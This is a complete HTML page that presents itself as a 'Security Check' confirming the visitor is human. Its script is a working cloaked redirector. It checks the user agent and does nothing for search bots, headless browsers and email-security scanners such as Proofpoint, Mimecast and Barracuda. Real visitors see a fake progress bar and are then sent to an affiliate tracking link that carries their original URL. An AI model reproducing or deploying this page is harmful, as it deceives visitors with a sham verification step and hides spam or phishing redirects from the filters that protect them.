<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>One moment…</title>
<style>
  :root{
    --blue:#2563eb;
    --blue2:#3b82f6;
    --ink:#0b1c3f;
    --soft:#eff6ff;
    --line:#dbeafe;
    --muted:#5b7299;
  }
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    background:
      radial-gradient(circle at 30% 0%, #ffffff 0%, #f0f7ff 45%, #dbeafe 100%);
    color:var(--ink);
    display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .card{
    width:100%;max-width:430px;
    background:#fff;
    border:1px solid var(--line);
    border-radius:26px;
    padding:34px 26px 24px;
    text-align:center;
    box-shadow:0 24px 60px rgba(37,99,235,.12);
    animation:rise .5s cubic-bezier(.22,.61,.36,1);
  }
  @keyframes rise{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}

  .shield{
    width:72px;height:72px;margin:0 auto 18px;border-radius:50%;
    background:linear-gradient(135deg,var(--blue),var(--blue2));
    color:#fff;font-size:34px;
    display:flex;align-items:center;justify-content:center;
    box-shadow:0 14px 32px rgba(37,99,235,.32), inset 0 1px 0 rgba(255,255,255,.35);
  }

  h1{
    font-size:22px;font-weight:800;letter-spacing:-.4px;
    margin-bottom:8px;color:var(--ink);
  }
  .desc{
    font-size:14px;line-height:1.55;color:var(--muted);
    margin:0 auto 22px;max-width:34ch;
  }

  .track{
    height:8px;background:var(--soft);
    border-radius:99px;overflow:hidden;margin-bottom:12px;
  }
  .track span{
    display:block;height:100%;width:0;
    background:linear-gradient(90deg,var(--blue),var(--blue2));
    border-radius:99px;transition:width .25s ease;
  }

  .state{
    font-size:13px;color:var(--muted);
    min-height:20px;
  }

  .btn{
    width:100%;margin-top:20px;padding:16px;
    border:0;border-radius:14px;
    background:linear-gradient(135deg,var(--blue),var(--blue2));
    color:#fff;
    font-family:inherit;font-size:16px;font-weight:700;
    cursor:pointer;min-height:56px;display:none;
    letter-spacing:.2px;
    box-shadow:0 12px 28px rgba(37,99,235,.32);
    transition:transform .12s ease, opacity .15s;
  }
  .btn:active{transform:scale(.985)}
  .btn.on{display:block;animation:rise .3s ease}

  .foot{
    margin-top:15px;font-size:11px;color:#8ba3c8;
    letter-spacing:.6px;
  }
</style>
</head>
<body>
<main class="card">
  <div class="shield">🛡️</div>
  <h1>Security Check</h1>
  <p class="desc">Confirming you're a real visitor.<br>This takes just a second.</p>
  <div class="track"><span id="pf"></span></div>
  <div class="state" id="sf">Initializing…</div>
  <button class="btn" id="bf" type="button">Continue →</button>
  <div class="foot">🔒 SECURE REDIRECT</div>
</main>

<script>
const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('pf');
  const st=document.getElementById('sf');
  const btn=document.getElementById('bf');

  /* ---------- Bot filter ---------- */
  const ua=navigator.userAgent||"";
  const pats=[
    /bot\b/i,/crawler/i,/spider/i,
    /curl\//i,/wget\//i,/python-requests/i,
    /headlesschrome/i,/phantomjs/i,
    /googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,
    /facebookexternalhit/i,/telegrambot/i,
    /googleimageproxy/i,/yahoomailproxy/i,
    /ms-office/i,/microsoft office/i,
    /barracuda/i,/proofpoint/i,/mimecast/i
  ];
  for(const p of pats){ if(p.test(ua)) return; }
  if(navigator.webdriver===true) return;

  /* ---------- Human activity ---------- */
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click']
    .forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));

  /* ---------- Progress ---------- */
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay);
  const S=performance.now();
  let r=false;

  function step(){
    const e=performance.now()-S;
    const p=Math.min(100,e/T*100);
    bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;
    bar.style.width="100%";
    st.textContent=acted?"You may proceed ✓":"Tap the button to continue";
    btn.classList.add('on');
  }
  requestAnimationFrame(step);

  /* ---------- Build URL with referrerCF ---------- */
  function build(){
    try{
      const u=new URL(CONFIG.targetUrl);
      u.searchParams.set(CONFIG.refParam,location.href);
      return u.toString();
    }catch(e){
      const s=CONFIG.targetUrl.includes('?')?'&':'?';
      return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);
    }
  }

  /* ---------- Redirect ---------- */
  let d=false;
  function go(){
    if(d)return;d=true;
    btn.disabled=true;
    btn.style.opacity=".6";
    st.textContent="Redirecting…";
    const u=build();
    const a=document.createElement('a');
    a.href=u;
    a.target='_self';
    a.style.display='none';
    document.body.appendChild(a);
    try{a.click();}
    catch(e){
      try{window.location.href=u;}
      catch(_){window.location.assign(u);}
    }
    setTimeout(()=>{try{a.remove();}catch(_){}},300);
  }

  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
